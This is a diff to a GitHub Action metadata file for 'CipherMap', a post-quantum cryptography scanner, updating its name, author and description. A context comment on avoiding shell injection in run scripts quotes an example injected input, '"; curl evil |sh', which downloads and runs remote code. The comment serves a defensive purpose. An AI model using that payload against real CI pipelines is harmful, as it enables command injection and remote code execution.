@@ -12,8 +12,9 @@
 # Inputs reach the shell through env, never by interpolating ${{ }} into a
 # run: script — an input containing `"; curl evil |sh` must arrive as data,
 # not become code.
-name: "CipherMap PQC Scan"
-description: "Scan for quantum-vulnerable cryptography, gate the build, and upload SARIF to code scanning"
+name: "CipherMap PQC & CBOM Scan"
+author: "CipherMap"
+description: "Zero-egress post-quantum cryptography (PQC) scanner, SARIF code-scanning gate, and signed CycloneDX 1.7 CBOM generator"
 branding:
   icon: "shield"
   color: "purple"
